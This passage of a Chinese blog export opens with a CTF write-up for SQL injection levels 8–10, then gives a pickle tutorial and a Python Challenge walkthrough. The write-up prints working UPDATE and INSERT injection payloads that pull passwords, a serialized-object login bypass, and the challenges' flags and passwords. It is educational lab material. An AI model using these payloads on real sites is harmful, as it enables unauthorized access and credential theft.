<p>上述语句会将字段4的值赋给字段2，本题应该考察的就是这个。</p>
<h2 id="测试注入点-7">测试注入点</h2>
<p>依次对所有的输入添加单引号，发现只有 Email 报错： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;1&#x27;, age = &#x27;1&#x27; WHERE id = 1&#x27; at line 3</span><br></pre></td></tr></table></figure></p>
<p>如果payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">email=1&#x27;&amp;name=abc&amp;icq=12345&amp;age=90&amp;edit=Edit</span><br></pre></td></tr></table></figure></p>
<p>报错信息为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;12345&#x27;,age = &#x27;90&#x27; WHERE id = 1&#x27; at line 3</span><br></pre></td></tr></table></figure></p>
<p>可以看到，被影响的只有 icq 和 age，而 name 没被影响，推测后台语句如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update tableName set name=&#x27;[input]&#x27;,emai=&#x27;[input]&#x27;,icq=&#x27;[input]&#x27;,age=&#x27;[input]&#x27; where id=1;</span><br></pre></td></tr></table></figure></p>
<h2 id="注入过程-7">注入过程</h2>
<p>上述可知，我们需要将密码的值赋给4个字段中的其中一个，有两种情况： - icq和age其中一个</p>
<p>有一个问题，这两个字段都在email的后面，要想赋值给这两个其中之一，需要在email中写完之后，将后面的所有语句注释掉。即： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">email=1&#x27;,icq=password,age=&#x27;23&#x27; where id=1;#</span><br><span class="line"></span><br><span class="line">真正查询语句为：update tableName set name=&#x27;[input]&#x27;,emai=&#x27;1&#x27;,icq=password,age=&#x27;23&#x27; where id=1;#&#x27;,icq=&#x27;[input]&#x27;,age=&#x27;[input]&#x27; where id=1;</span><br></pre></td></tr></table></figure></p>
<p>测试发现这种做法不行。报错信息为：<code>near 'icq = '12345',age = '90' WHERE id = 1'</code>。</p>
<ul>
<li>email和name其中一个</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">根据报错信息：12345&#x27;,age = &#x27;90&#x27; WHERE id = 1，需要将 icq=&#x27; 补齐</span><br><span class="line">1. email=&#x27;,email=password,icq=&#x27;</span><br><span class="line">2. email=1&#x27;,name=password,icq=&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318212222.png" /></p>
<p>成功得到密码。 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 9ea04c5d4f90dae92c396cf7a6787715  </span><br><span class="line">  </span><br><span class="line">The password for the next level is: network_pancakes_milk_and_wine</span><br></pre></td></tr></table></figure></p>
<h3 id="疑惑点">疑惑点 ⭐</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. email=&#x27;</span><br><span class="line">2. email=&#x27;#</span><br></pre></td></tr></table></figure>
<p>报错信息分别为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 12345&#x27; balabala</span><br><span class="line">2. icq=&#x27;12345&#x27; balabala</span><br></pre></td></tr></table></figure></p>
<p>也就是注释符只注释了email=’‘ 中后面的单引号。前者为 <code>(email='')(',icq=')12345'</code>，括号只是为了方便看。而后者为 <code>(email='')#',icq='12345'</code>，按道理后面的都应该被注释掉了，我的猜测如下（本人php代码差，如果有误请多多批评）：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">update tableName set name=&#x27;[input]&#x27;,</span><br><span class="line">emai=&#x27;[input]&#x27;,</span><br><span class="line">icq=&#x27;[input]&#x27;,</span><br><span class="line">age=&#x27;[input]&#x27; where id=1;</span><br></pre></td></tr></table></figure>
<p>这样子注释符就只会注释掉email那行最后面的单引号和逗号，从而报错信息变为 <code>icq='12345' balabala</code>。</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318213900.png" /></p>
<p>图上报错信息中的换行符也应证了我的猜想。</p>
<h1 id="level-9">Level-9</h1>
<h2 id="题目描述-8">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318213950.png" /></p>
<p>在输入框填入东西后，提交查询，发现多了信息： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318214029.png" /></p>
<p>因此猜测后台使用的语句是 <code>insert into</code>。</p>
<p><code>inser into</code> 语句格式如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO 表名称 VALUES (值1, 值2,....)</span><br><span class="line">指定所要插入数据的列:</span><br><span class="line">INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....)</span><br><span class="line">一次性添加多个：（注意，如果有主键，主键必须不同）</span><br><span class="line">INSERT INTO table_name (列1, 列2,...) VALUES (值1, 值2,....),(值1, 值2,....),(值1, 值2,....),...</span><br></pre></td></tr></table></figure>
<h2 id="测试注入点-8">测试注入点</h2>
<p>依次对三个输入框添加单引号，发现 <code>autor=1&amp;title=1&amp;text=1'</code> 时出现报错信息： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318214508.png" /></p>
<p>单独将重要信息提取：<code>'1'')</code>，可以猜测后台语句为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO level9_users (autor,title,text) VALUES (&#x27;input&#x27;,&#x27;input&#x27;,&#x27;input&#x27;);</span><br></pre></td></tr></table></figure></p>
<p>输入 <code>autor=1&amp;title=1&amp;text=1')#</code> 发现页面正常，验证了猜测。</p>
<h2 id="注入过程-8">注入过程</h2>
<p>利用一次性添加多个。</p>
<p>构造如下payload： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">autor=1&amp;title=1&amp;text=1&#x27;),((select username from level9_users limit 0,1),(select password from level9_users limit 0,1),&#x27;456</span><br></pre></td></tr></table></figure></p>
<p>带入后为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">INSERT INTO level9_users (autor,title,text) VALUES (&#x27;input&#x27;,&#x27;input&#x27;,&#x27;1&#x27;),((select username from level9_users limit 0,1),(select password from level9_users limit 0,1),&#x27;456&#x27;);</span><br></pre></td></tr></table></figure></p>
<p>正好将 username 和 password 作为 autor 和 title 显示出来。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220051.png" /></p>
<p>成功登录。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 84ec870f1ac294508400e30d8a26a679</span><br><span class="line"></span><br><span class="line">The password for the next level is: whatever_just_a_fresh_password</span><br></pre></td></tr></table></figure>
<h1 id="level-10">Level-10 ⭐</h1>
<h2 id="题目描述-9">题目描述</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220508.png" /></p>
<p>点击 login 发现： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220532.png" /></p>
<p>也就是这里需要垂直提权。</p>
<h2 id="测试注入点-9">测试注入点</h2>
<p>由于没有多余的信息，并且url也不存在注入点，所以抓包看看： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220631.png" /></p>
<p>一般垂直提权都是看cookie，但是这里cookie的信息是登录每道题的，所以应该是post中的 <code>login</code>。将上面的字符串base64解码后得到： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220318220733.png" /></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:6:&quot;Monkey&quot;;s:8:&quot;password&quot;;s:12:&quot;0815password&quot;;&#125;</span><br></pre></td></tr></table></figure>
<p>这里应该需要修改username和password的值，也就是第2和第4的内容。</p>
<p>经过多次测试，还是毫无发现。就去看了下大佬的writeup，根据推测，后台语句为： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$input</span> = unserialize(base64_encode(<span class="variable">$POST</span>[<span class="string">&quot;login&quot;</span>]));</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$input</span>[<span class="string">&quot;username&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$input</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select username,password from users where username=<span class="subst">$username</span> and password=<span class="subst">$password</span>&quot;</span>;</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>用户名为：<code>TheMaster</code>。密码不知道，所以 password 即为注入点。</p>
<h2 id="注入过程-9">注入过程</h2>
<p>本题要想成功登录，就得 where 后面的语句为真，即<code>username=$username</code>和<code>password=$password</code>同时为真。前者简单，后者可以这么操作，即<code>password=true</code>，这样子就能绕过where的判断。</p>
<p>因此最后的payload如下： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">a:2:&#123;s:8:&quot;username&quot;;s:9:&quot;TheMaster&quot;;s:8:&quot;password&quot;;b:1;&#125; </span><br><span class="line">解释：bool型的就是b，且true为1，false为0</span><br></pre></td></tr></table></figure></p>
<p>经过base64编码后带入即可成功登录。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">You can raise your wechall.net score with this flag: 721ce43d433ad85bcfa56644b112fa52  </span><br><span class="line"></span><br><span class="line">The password for the hall of fame is: make_the_internet_great_again</span><br></pre></td></tr></table></figure>
<h1 id="总结">总结</h1>
<p>经过这十道题，发现sql注入不仅仅是常规类型的考察，还有不同语句，如：update，insert into等。有时候还要猜测后台语句的写法，或者像 Level-6一样，注入语句中返回的结果作为输入二次查询，还得明白常见的后台判断。总之，收获良多，是很好的题目。</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>Web安全</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>pickle 库</title>
    <url>/2022/01/30/pickle%20%E5%BA%93/</url>
    <content><![CDATA[<p>pickle 库的简单使用。</p>
<span id="more"></span>
<h1 id="前言">前言</h1>
<p>官方文档：<a href="https://docs.python.org/zh-cn/3/library/pickle.html">pickle</a></p>
<h1 id="介绍">介绍</h1>
<p>模块 pickle 实现了对一个 Python 对象结构的二进制序列化和反序列化。</p>
<h1 id="常用方法">常用方法</h1>
<p>主要由两类接口，即序列化和反序列化。</p>
<p>其中序列化包括： 1. dump() 2. dumps()</p>
<p>反序列化包括： 1. load() 2. loads()</p>
<p><strong>序列化后的对象是 bytes 类型的，反序列后的对象同样也是 bytes 类型的，也就是二进制文件。</strong></p>
<h2 id="dump">dump</h2>
<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, file, protocol=<span class="literal">None</span>, *, fiximports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
<blockquote>
<p>将对象 obj 序列化以后的对象写入已打开的 file object file。</p>
</blockquote>
<p>参数： 主要参数就是前两个： - obj：要序列化的对象 - file：序列化完之后的对象需要写入到 file 中。</p>
<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;  </span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pickle使用的文件/after.p&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    pickle.dump(tar, f)</span><br></pre></td></tr></table></figure></p>
<h2 id="dumps">dumps</h2>
<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.dump(obj, protocol=<span class="literal">None</span>, *, fiximports=<span class="literal">True</span>, buffer_callback=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
<p>参数： - obj：要序列化的对象 - 少了 file</p>
<ul>
<li>返回值 <strong>直接返回序列化后的二进制对象。（这是与 dump 最大的区别）</strong></li>
</ul>
<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(pickle.dumps(tar))</span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">b&#x27;\x80\x04\x95\x1c\x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x04name\x94\x8c\x05lihua\x94\x8c\x03age\x94K\x1eu.&#x27;</span><br></pre></td></tr></table></figure></p>
<h2 id="load">load</h2>
<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.load(file, *, protocol=<span class="literal">None</span>, fiximports=<span class="literal">True</span>, encoding=<span class="string">&#x27;ASCII&#x27;</span>, errors=<span class="string">&#x27;strict&#x27;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
<p>参数： - file：要反序列的<strong>二进制文件</strong></p>
<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;pickle使用的文件/after.p&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:  </span><br><span class="line">    <span class="built_in">print</span>(pickle.load(f))</span><br></pre></td></tr></table></figure></p>
<p>利用上面的 dump 的序列化后的二进制文件做演示，得到结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;lihua&#x27;, &#x27;age&#x27;: 30&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="loads">loads</h2>
<p>语法： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pickle.loads(data, /, *, fix_imports=<span class="literal">True</span>, encoding=<span class="string">&quot;ASCII&quot;</span>, errors=<span class="string">&quot;strict&quot;</span>, buffers=<span class="literal">None</span>)</span><br></pre></td></tr></table></figure></p>
<p>参数： - data：需要反序列化的<strong>二进制对象</strong></p>
<p>返回值： <strong>直接返回反序列化后的对象。（这是与 load 的最大区别）</strong></p>
<p>例子： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line">tar = &#123;<span class="string">&quot;name&quot;</span>: <span class="string">&quot;lihua&quot;</span>, <span class="string">&quot;age&quot;</span>: <span class="number">30</span>&#125;</span><br><span class="line">tars = pickle.dumps(tar)  <span class="comment"># 先序列化</span></span><br><span class="line"><span class="built_in">print</span>(pickle.loads(tars)) <span class="comment"># 再反序列化</span></span><br></pre></td></tr></table></figure></p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;name&#x27;: &#x27;lihua&#x27;, &#x27;age&#x27;: 30&#125;</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pickle</tag>
      </tags>
  </entry>
  <entry>
    <title>python challenge 题解</title>
    <url>/2022/01/29/python%20challenge%20%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<p>这是个人的 python challenge 的刷题记录，网址是：<a href="http://www.pythonchallenge.com/">python challenge</a>。更多内容请点击 <strong>阅读全文</strong>，如有错误，欢迎在评论区指出。</p>
<span id="more"></span>
<h1 id="level-0">level 0</h1>
<h2 id="题目信息">题目信息</h2>
<p>题目信息如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220129214059.png" /></p>
<p>提示：修改 url 的值，并且画面中为 <span class="math inline">\(2^{38}\)</span>，当前 url 为： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.pythonchallenge.com/pc/def/0.html</span><br></pre></td></tr></table></figure></p>
<h2 id="方法">方法</h2>
<p>代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">res = <span class="number">2</span> ** <span class="number">38</span></span><br><span class="line"><span class="built_in">print</span>(res) <span class="comment"># 274877906944</span></span><br></pre></td></tr></table></figure></p>
<p>将 url 中的 0 用 274877906944 代替即可。</p>
<h1 id="level-1">level 1</h1>
<h2 id="题目信息-1">题目信息</h2>
<p>题目信息如下：</p>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220129215240.png" /></p>
<p>根据图片应该是某种加密方法，图中的 <code>K-&gt;M, O-&gt;Q, E-&gt;G</code>，正好符合规律：<strong>K往后两个字母就是M，O往后两个字母就是Q，E往后两个字母就是G</strong>。猜测只要把下面粉色的字母全部用自己的后两个字母代替即可。</p>
<h2 id="方法-1">方法 1</h2>
<p>代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">encypt_str = <span class="string">&quot;g fmnc wms bgblr rpylqjyrc gr zw fylb. rfyrq ufyr amknsrcpq ypc dmp. bmgle gr gl zw fylb gq glcddgagclr ylb rfyr&#x27;q ufw rfgq rcvr gq qm jmle. sqgle qrpgle.kyicrpylq() gq pcamkkclbcb. lmu ynnjw ml rfc spj. &quot;</span> <span class="comment"># 原来的字符串  </span></span><br><span class="line">  </span><br><span class="line">shift = <span class="number">2</span> <span class="comment"># 后移步数  </span></span><br><span class="line">new_str = <span class="string">&quot;&quot;</span> <span class="comment"># 新的字符串  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> encypt_str:  </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">str</span>.isalpha(ch): <span class="comment"># 判断是否是字母  </span></span><br><span class="line">        ch = <span class="built_in">ord</span>(ch)</span><br><span class="line">        ch = ((ch + shift) - <span class="number">97</span>) % <span class="number">26</span> + <span class="number">97</span> <span class="comment">#  y 和 z 变成 a 和 b</span></span><br><span class="line">        ch = <span class="built_in">chr</span>(ch)  </span><br><span class="line">    new_str += ch  </span><br><span class="line"><span class="built_in">print</span>(new_str)</span><br></pre></td></tr></table></figure> （需要注意的是 y 和 z 变成 a 和 b 的时候！！！）</p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">i hope you didnt translate it by hand. thats what computers are for. doing it in by hand is inefficient and that&#x27;s why this text is so long. using string.maketrans() is recommended. now apply on the url.</span><br></pre></td></tr></table></figure></p>
<p>发现除了提示我们可以使用 maketrans() 方法之外，没有其他信息。我们回到 url <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://www.pythonchallenge.com/pc/def/map.html</span><br></pre></td></tr></table></figure></p>
<p>根据本题的加密方法，将 <code>map -&gt; ocr</code> 即可跳转下一关。 （其实，连代码都没必要写！！！）</p>
<h2 id="方法-2">方法 2</h2>
<h3 id="maketrans-方法介绍">maketrans() 方法介绍</h3>
<blockquote>
<p>Python maketrans() 方法用于创建字符映射的转换表，对于接受两个参数的最简单的调用方式，第一个参数是字符串，表示需要转换的字符，第二个参数也是字符串表示转换的目标。 <strong>注：</strong>两个字符串的长度必须相同，为一一对应的关系。python 3 和 python 2 的使用方法不同，2 需要导入 string，而 3 不需要。</p>
</blockquote>
<ul>
<li><p>语法： <code>str.maketrans(intab, outtab)</code></p></li>
<li><p>参数：</p>
<ul>
<li>intab：字符串中要替代的字符组成的字符串。</li>
<li>outab：与 intab 一一对应的映射字符的字符串。</li>
</ul></li>
<li><p>返回值： 返回字符串转换后生成的新字符串。</p></li>
<li><p>一般配合 translate() 使用</p></li>
</ul>
<h3 id="translate-方法介绍">translate() 方法介绍</h3>
<blockquote>
<p>Python translate() 方法根据参数table给出的表(包含 256 个字符)转换字符串的字符, 要过滤掉的字符放到 del 参数中。</p>
</blockquote>
<ul>
<li><p>语法： <code>str.translate(table[, deletechars]);</code></p></li>
<li><p>参数：</p>
<ul>
<li>table：翻译表，翻译表是通过maketrans方法转换而来。</li>
<li>deletechars：字符串中要过滤的字符列表。</li>
</ul></li>
<li><p>返回值： 返回翻译后的字符串。</p></li>
<li><p>本题演示： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">encypt_str = <span class="string">&quot;g fmnc wms bgblr rpylqjyrc gr zw fylb. rfyrq ufyr amknsrcpq ypc dmp. bmgle gr gl zw fylb gq glcddgagclr ylb rfyr&#x27;q ufw rfgq rcvr gq qm jmle. sqgle qrpgle.kyicrpylq() gq pcamkkclbcb. lmu ynnjw ml rfc spj. &quot;</span></span><br><span class="line"></span><br><span class="line">intab = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span>  </span><br><span class="line">outtab = <span class="string">&quot;cdefghijklmnopqrstuvwxyzab&quot;</span>  </span><br><span class="line">trantab = encypt_str.maketrans(intab, outtab)  </span><br><span class="line">  </span><br><span class="line"><span class="built_in">print</span>(encypt_str.translate(trantab))</span><br></pre></td></tr></table></figure></p></li>
</ul>
<h2 id="方法-3">方法 3</h2>
<h3 id="zip-方法介绍">zip() 方法介绍</h3>
<blockquote>
<p><strong>zip()</strong> 函数用于将可迭代的对象作为参数，将对象中 <strong>对应的元素</strong> 打包成一个个元组，然后返回由这些元组组成的对象，这样做的好处是节约了不少的内存。 我们可以使用 list() 转换来输出列表。也可以用 dict() 转换为字典，此时就产生了映射关系。 如果各个迭代器的元素个数不一致，则返回列表长度与最短的对象相同，利用 * 号操作符，可以将元组解压为列表。</p>
</blockquote>
<ul>
<li><p>语法： <code>zip([iterable, ...])</code></p></li>
<li><p>参数：</p>
<ul>
<li>iterabl：一个或多个迭代器</li>
</ul></li>
<li><p>返回值： 返回一个对象。</p></li>
<li><p>解压： <code>zip(*被压缩的对象)</code>，返回二维矩阵式</p></li>
<li><p>本题演示： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line">encypt_str = <span class="string">&quot;g fmnc wms bgblr rpylqjyrc gr zw fylb. rfyrq ufyr amknsrcpq ypc dmp. bmgle gr gl zw fylb gq glcddgagclr ylb rfyr&#x27;q ufw rfgq rcvr gq qm jmle. sqgle qrpgle.kyicrpylq() gq pcamkkclbcb. lmu ynnjw ml rfc spj. &quot;</span> <span class="comment"># 原来的字符串</span></span><br><span class="line"></span><br><span class="line">intab = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz,. &#x27;()&quot;</span>  </span><br><span class="line">outtab = <span class="string">&quot;cdefghijklmnopqrstuvwxyzab,. &#x27;()&quot;</span>  </span><br><span class="line">transtab = <span class="built_in">dict</span>(<span class="built_in">zip</span>(intab, outtab))  </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(transtab[x] <span class="keyword">for</span> x <span class="keyword">in</span> encypt_str))</span><br></pre></td></tr></table></figure></p></li>
</ul>
<h1 id="level-2">level 2</h1>
<h2 id="题目信息-2">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130103607.png" /></p>
<p>注意红色字符串，要我们从图片中的书里或者页面源码中找字符。首先，书里根本看不清，所以只能从页面源码中找，打开页面源码，往下滑动，发现确实有，但是内容很多，需要写脚本。 <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130103757.png" /></p>
<h2 id="方法-4">方法</h2>
<p><strong>步骤：</strong></p>
<ol type="1">
<li><p>请求网址，获得页面源码</p></li>
<li><p>拿到这串字符串</p></li>
<li><p>从中找出字母</p></li>
</ol>
<p><strong>代码：</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests  </span><br><span class="line"><span class="keyword">import</span> re  </span><br><span class="line">url = <span class="string">&quot;http://www.pythonchallenge.com/pc/def/ocr.html&quot;</span>  </span><br><span class="line">r = requests.get(url)  </span><br><span class="line">tar = re.findall(<span class="string">r&#x27;&lt;!--(.*?)--&gt;&#x27;</span>, r.text, flags=re.S)[<span class="number">1</span>]  <span class="comment"># 找到一大串字符串</span></span><br><span class="line">ch_lst = re.findall(<span class="string">r&#x27;[a-zA-Z0-9]+&#x27;</span>, tar)  <span class="comment"># 拿到字符串中的字符</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(ch <span class="keyword">for</span> ch <span class="keyword">in</span> ch_lst)) <span class="comment"># 拼接成 url</span></span><br></pre></td></tr></table></figure></p>
<p><strong>结果：</strong> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">equality</span><br></pre></td></tr></table></figure></p>
<p>修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/def/ocr.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/def/equality.html</span><br></pre></td></tr></table></figure></p>
<h1 id="level-3">level 3</h1>
<h2 id="题目信息-3">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130142422.png" /></p>
<p>除了一句提示，什么都没有。查看页面源码，发现字符串： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130142748.png" /></p>
<p>根据提示做出合理猜测：<strong>找出这一字符串中的小写字母，每个小写字母的前后都是三个大写字母！！！也就是 AAAbCCC 类型的</strong></p>
<h2 id="方法-5">方法</h2>
<p><strong>步骤：</strong></p>
<ol type="1">
<li>请求网址，拿到页面源码</li>
<li>取出这一大串字符串</li>
<li>从中找出符合条件的小写字母</li>
</ol>
<p><strong>代码：</strong></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re  </span><br><span class="line">url = <span class="string">&#x27;http://www.pythonchallenge.com/pc/def/equality.html&#x27;</span>  </span><br><span class="line">r = requests.get(url)  </span><br><span class="line">tar = re.findall(<span class="string">r&#x27;&lt;!--(.*?)--&gt;&#x27;</span>, r.text, flags = re.S)[-<span class="number">1</span>] <span class="comment"># 取出目标字符串  </span></span><br><span class="line">ch_lst = re.findall(<span class="string">r&#x27;[^A-Z]+[A-Z]&#123;3&#125;([a-z])[A-Z]&#123;3&#125;[^A-Z]+&#x27;</span>, tar, re.S)    <span class="comment"># 从目标字符串中取出符合条件的小写字母  </span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;&quot;</span>.join(ch <span class="keyword">for</span> ch <span class="keyword">in</span> ch_lst)) <span class="comment"># 拼接成 url</span></span><br></pre></td></tr></table></figure>
<p><strong>解释：</strong> 主要说明一下取出符合条件的小写字母的模式是如何而来的。</p>
<p><code>[a-z]</code> 表示一个小写字母；</p>
<p><code>[A-Z]</code> 表示一个大写字母；</p>
<p><code>[A-Z]&#123;3&#125;</code> 表示三个大写字母；</p>
<p><code>[A-Z]&#123;3&#125;[a-z][A-Z]&#123;3&#125;</code> 表示 ...AAAbCCC... 类型的，注意 ... 可能为大写，比如说：AAAAbCCC 也是会被匹配到的，但是，题目要求的小写字母是前后严格只有三个大写字母，所以还需要补上 <code>[^A-Z]</code> ，这表示非大写字母</p>
<p>总的模式就是：<code>[^A-Z]+[A-Z]&#123;3&#125;([a-z])[A-Z]&#123;3&#125;[^A-Z]+</code>，这个 <code>+</code> 写不写无所谓，就本题而言，主要是 <code>aAAAbCCCc</code> 的都行，无所谓前后是大写还是小写。</p>
<p>结果： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">linkedlist</span><br></pre></td></tr></table></figure></p>
<p>修改 url： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">修改前：http://www.pythonchallenge.com/pc/def/equality.html</span><br><span class="line">修改后：http://www.pythonchallenge.com/pc/def/linkedlist.html</span><br></pre></td></tr></table></figure></p>
<p>访问修改后的 url 得到提示 <code>linkedlist.php</code> ，访问<code>http://www.pythonchallenge.com/pc/def/linkedlist.php</code> 即可。</p>
<h1 id="level-4">level 4</h1>
<h2 id="题目信息-4">题目信息</h2>
<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130194001.png" /></p>
<p>页面源码： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130194018.png" /></p>
<p>点击图片发现可以跳转： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130194032.png" /></p>
<p>注意 url 中的 nothing，应该是通过不停的获得 nothing 然后跳转到下一个页面，最后某个页面会出来答案。手动几次后发现确实如此： <img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220130194143.png" /></p>
<p><strong>注意：本题深坑</strong></p>
<h2 id="方法-6">方法</h2>
<p><strong>代码：</strong> <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, re  </span><br><span class="line">nothing = <span class="number">12345</span>  </span><br><span class="line"><span class="built_in">str</span> = <span class="string">&#x27;http://www.pythonchallenge.com/pc/def/linkedlist.php?nothing=%d&#x27;</span>  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):  </span><br><span class="line">    url = <span class="built_in">str</span> % nothing  </span><br><span class="line">    r = requests.get(url)  </span><br><span class="line">    <span class="keyword">try</span>:  </span><br><span class="line">        nothing = <span class="built_in">int</span>(re.findall(<span class="string">r&#x27;\d+&#x27;</span>, r.text)[-<span class="number">1</span>])  </span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;nothing: %d&quot;</span> % nothing)  </span><br><span class="line">    <span class="keyword">except</span>:  </span><br><span class="line">        nothing /= <span class="number">2</span>  </span><br><span class="line">	<span class="built_in">print</span>(r.text)</span><br></pre></td></tr></table></figure></p>
